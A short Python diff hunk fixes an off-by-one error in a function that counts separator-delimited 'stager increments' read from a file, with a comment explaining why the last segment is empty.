@@ -31,7 +31,9 @@ def get_stager_increments():
     with open(filename, 'r') as fp:
         content = fp.read()
 
-    result = len(content.split('{{separator}}'))
+    # last increment is always empty, because of the way the separators
+    # are defined
+    result = len(content.split('{{separator}}')) - 1
     return result
 
 
